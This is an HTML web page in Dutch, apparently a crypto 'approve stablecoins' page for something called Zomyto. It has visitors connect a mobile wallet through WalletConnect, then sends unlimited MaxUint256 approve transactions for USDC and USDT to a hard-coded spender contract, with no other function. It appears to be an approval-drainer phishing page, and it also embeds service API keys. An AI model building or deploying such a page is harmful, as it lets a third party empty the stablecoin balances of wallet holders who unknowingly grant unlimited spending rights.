<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Zomyto – Approve USDC & USDT</title>

  <!-- Ethers v5 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <!-- Web3Modal v2 (WalletConnect v2) -->
  <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.umd.js"></script>
  <script src="https://unpkg.com/@web3modal/html@2.7.1/dist/index.umd.js"></script>

  <style>
    body { background:#121212; color:white; font-family:Arial, sans-serif; text-align:center; padding-top:50px; }
    button { background:#1e88e5; color:white; padding:12px 20px; border:none; border-radius:8px; font-size:1rem; cursor:pointer; margin: 10px; }
    button:disabled { background:grey; cursor:not-allowed; }
    #status { margin-top:20px; font-size:0.9rem; color:#ccc; }
  </style>
</head>
<body>

  <h1>Zomyto – Approve Stablecoins</h1>
  <p>
    1. Verbind je mobiele wallet (bijv. Exodus) via WalletConnect.<br>
    2. Klik op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
  </p>

  <!-- Web3Modal connect button -->
  <w3m-button></w3m-button>

  <div style="margin-top:30px;">
    <button id="approveBtn" disabled>✅ Approve USDC &amp; USDT</button>
  </div>

  <div id="status">Status: Niet verbonden</div>

  <script>
    // ===== CONFIG =====
    const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // jouw WalletConnect v2 projectId

    // Ethereum mainnet
    const CHAIN_ID = 1;
    const RPC_URL = "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2";

    // ERC20 tokens op mainnet
    const TOKENS = [
      { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
    ];

    // JOUW contract dat toestemming krijgt
    const SPENDER = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";

    const tokenABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    const { EthereumClient, w3mConnectors, w3mProvider } = window.W3mEthereum;
    const { Web3Modal } = window.W3mHtml;

    const chainsConfig = [
      {
        id: CHAIN_ID,
        name: "Ethereum",
        network: "homestead",
        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
        rpcUrls: {
          default: { http: [RPC_URL] },
          public: { http: [RPC_URL] }
        }
      }
    ];

    const wagmiConfig = {
      autoConnect: true,
      connectors: w3mConnectors({ projectId, chains: chainsConfig }),
      publicClient: w3mProvider({ projectId, chains: chainsConfig })
    };

    const ethereumClient = new EthereumClient(wagmiConfig, chainsConfig);
    const web3modal = new Web3Modal(
      {
        projectId,
        themeMode: "dark",
        enableAnalytics: false
      },
      ethereumClient
    );

    let ethersProvider = null;
    let signer = null;

    const statusEl = document.getElementById("status");
    const approveBtn = document.getElementById("approveBtn");

    function setStatus(msg) {
      console.log(msg);
      statusEl.textContent = "Status: " + msg;
    }

    async function initEthersFromWallet() {
      try {
        const walletProvider = await ethereumClient.getProvider();
        if (!walletProvider) {
          setStatus("Geen provider gevonden, verbind eerst de wallet.");
          return;
        }

        ethersProvider = new ethers.providers.Web3Provider(walletProvider);
        signer = ethersProvider.getSigner();

        const address = await signer.getAddress();
        const network = await ethersProvider.getNetwork();
        setStatus(`Verbonden met ${address} op chainId ${network.chainId}`);

        if (Number(network.chainId) !== CHAIN_ID) {
          alert("Let op: je zit niet op Ethereum mainnet. Schakel over in je wallet.");
        }

        approveBtn.disabled = false;
      } catch (err) {
        console.error(err);
        setStatus("Fout bij initialiseren ethers: " + err.message);
        approveBtn.disabled = true;
      }
    }

    // Reageer op connect/disconnect
    ethereumClient.watchAccount((account) => {
      if (account.isConnected) {
        setStatus("Wallet verbonden, initialiseer ethers...");
        initEthersFromWallet();
      } else {
        setStatus("Niet verbonden");
        approveBtn.disabled = true;
        signer = null;
        ethersProvider = null;
      }
    });

    // ===== APPROVE KNOP =====
    approveBtn.onclick = async () => {
      if (!signer) {
        alert("Geen signer gevonden. Verbind eerst je wallet.");
        return;
      }

      try {
        for (const t of TOKENS) {
          setStatus(`Verstuur approve transactie voor ${t.name}...`);
          const token = new ethers.Contract(t.address, tokenABI, signer);

          // MaxUint256 = onbeperkte toestemming
          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
          setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
          await tx.wait();
          console.log(`✅ Approved ${t.name}`);
        }

        setStatus("USDC & USDT succesvol goedgekeurd!");
        alert("USDC & USDT succesvol goedgekeurd!");
      } catch (err) {
        console.error(err);
        setStatus("Fout bij approve: " + err.message);
        alert("Fout bij approve: " + err.message);
      }
    };
  </script>

</body>
</html>
